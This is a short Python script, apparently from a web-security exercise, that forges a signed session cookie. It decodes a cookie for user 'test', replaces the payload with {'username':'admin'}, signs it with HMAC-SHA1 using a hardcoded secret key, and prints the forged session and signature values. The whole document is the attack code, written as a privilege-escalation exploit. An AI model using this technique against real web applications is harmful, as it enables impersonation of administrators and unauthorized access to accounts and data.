import hashlib
import hmac
import base64

# Decode session payload
session_payload = base64.b64decode("eyJ1c2VybmFtZSI6InRlc3QifQ==").decode()

# Generate new session payload
new_session_payload = '{"username": "admin"}'

# Sign the new session payload
key = "bMmwOXAHRHbVpv1F5J6thTZoHaoI630n"
signature = hmac.new(key.encode(), new_session_payload.encode(), hashlib.sha1).hexdigest()

# Update the session with the new payload and signature
new_session = {
    "session": base64.b64encode(new_session_payload.encode()).decode(),
    "session.sig": signature
}

# Print the modified session
print(new_session)
